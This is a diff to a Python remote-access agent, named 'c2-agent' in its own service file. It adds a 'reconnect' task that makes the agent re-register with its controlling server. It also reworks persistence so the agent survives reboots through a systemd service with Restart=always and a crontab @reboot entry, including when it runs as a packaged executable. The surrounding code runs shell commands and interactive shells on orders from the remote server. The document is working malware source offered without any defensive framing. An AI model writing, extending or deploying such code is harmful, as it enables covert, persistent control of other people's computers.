@@ -266,7 +266,10 @@ def exec_shell(cmd):
     except Exception as ex:
         return {"stdout": "", "stderr": str(ex), "code": -1}
 
+RECONNECT = False
+
 def do_task(t):
+    global RECONNECT
     typ, pay = t.get("type", ""), t.get("payload", "")
     tid = t.get("id", 0)
     res = {"task_id": tid, "status": "done", "output": {}}
@@ -317,6 +320,10 @@ def do_task(t):
         shell_stop()
         os._exit(0)
 
+    elif typ == "reconnect":
+        res["output"] = {"stdout": "reconnecting", "stderr": "", "code": 0}
+        RECONNECT = True
+
     else:
         res["output"] = {"stdout": f"unknown type: {typ}", "stderr": "", "code": -1}
 
@@ -329,7 +336,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart={python} {agent} --server {server}
+ExecStart={exec_cmd}
 Restart=always
 RestartSec=10
 
@@ -341,9 +348,11 @@ def install_persistence():
     agent_path = os.path.abspath(sys.argv[0])
     srv = SERVER
     is_win = platform.system() == "Windows"
+    is_frozen = getattr(sys, 'frozen', False)
 
     if not is_win:
-        svc = SERVICE_TEMPLATE.format(python=sys.executable, agent=agent_path, server=srv)
+        exec_cmd = agent_path if is_frozen else f"{sys.executable} {agent_path}"
+        svc = SERVICE_TEMPLATE.format(exec_cmd=f"{exec_cmd} --server {srv}")
         local_path = os.path.join(os.path.dirname(agent_path), "c2-agent.service")
         with open(local_path, "w") as f:
             f.write(svc)
@@ -361,7 +370,7 @@ def install_persistence():
             print(f"    sudo cp {local_path} /etc/systemd/system/c2-agent.service")
             print(f"    sudo systemctl daemon-reload && sudo systemctl enable c2-agent && sudo systemctl start c2-agent")
 
-        cron = f"@reboot {sys.executable} {agent_path} --server {srv} &"
+        cron = f"@reboot {exec_cmd} &"
         try:
             existing = subprocess.run("crontab -l 2>/dev/null", shell=True, capture_output=True, text=True).stdout
             if cron in existing:
@@ -564,11 +573,26 @@ def main():
         for t in tasks:
             r = do_task(t)
             send_result(r)
+            if RECONNECT:
+                RECONNECT = False
+                shell_stop()
+                break
             if t.get("type") == "exit":
                 shell_stop()
                 return
             if t.get("type") in ("shell_start", "shell_input", "shell_stop", "shell_resize"):
                 sleep_time = 0.5
+
+        if RECONNECT:
+            RECONNECT = False
+            print("[agent] reconnecting...")
+            poll_count = 0
+            # re-register
+            get_key()
+            INTERVAL = register()
+            if not AID:
+                print("[agent] re-register fail")
+            continue
 
         # if shell active, poll faster
         if SH_FD is not None:
